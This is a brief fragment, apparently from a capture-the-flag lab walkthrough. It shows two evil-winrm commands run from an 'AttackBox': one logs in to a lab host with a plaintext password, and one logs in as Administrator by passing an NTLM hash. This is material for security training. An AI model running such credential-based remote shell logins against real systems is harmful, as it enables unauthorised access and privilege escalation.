...
```shell-session
user@AttackBox$ evil-winrm -i 10.80.168.47 -u thmuser1 -p Password321
...
```shell-session
user@AttackBox$ evil-winrm -i 10.80.168.47 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```
